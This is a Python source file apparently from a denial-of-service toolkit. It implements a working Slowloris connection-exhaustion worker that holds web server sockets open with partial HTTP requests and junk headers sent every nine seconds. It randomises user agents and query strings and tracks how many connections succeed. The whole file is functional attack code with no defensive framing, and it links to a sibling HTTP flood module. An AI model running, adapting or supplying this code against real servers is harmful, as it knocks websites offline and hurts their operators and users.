# language: Python 3.10+, file: Module/slowloris.py
# *Slowloris connection exhaustion -- direct (no proxy), holds sockets open*
# entry: slowloris_worker(host, port, duration)

import asyncio, random
from Module.http_flood import USER_AGENTS, ACCEPT_LANGS
from Module.state      import stats, slock, stop

async def slowloris_worker(host: str, port: int, duration: float) -> None:
    """
    Opens an HTTP/1.1 connection, sends a partial request (no terminal CRLF),
    then drip-feeds header bytes every 9s to keep it alive for *duration* seconds.
    SSL auto-detected on port 443.
    Retries up to 3 times if the initial connect fails.
    """
    use_ssl = (port == 443)

    for _ in range(3):
        if stop[0]:
            return
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=use_ssl),
                timeout=5.0,
            )
            # partial request -- no terminating \r\n so the server keeps waiting
            partial = (
                f"GET /?{random.randint(1, 999999)} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Accept-Language: {random.choice(ACCEPT_LANGS)}\r\n"
                f"Content-Length: 65536\r\n"
            )
            writer.write(partial.encode())
            await writer.drain()
            with slock:
                stats["sent"]    += 1
                stats["success"] += 1

            deadline = asyncio.get_event_loop().time() + duration
            while not stop[0] and asyncio.get_event_loop().time() < deadline:
                # *keep-alive drip: one junk header every 9s*
                writer.write(b"X-a: b\r\n")
                await writer.drain()
                await asyncio.sleep(9)

            writer.close()
            await writer.wait_closed()
            return   # clean exit after one successful connection hold

        except Exception:
            with slock:
                stats["sent"] += 1
                stats["fail"] += 1
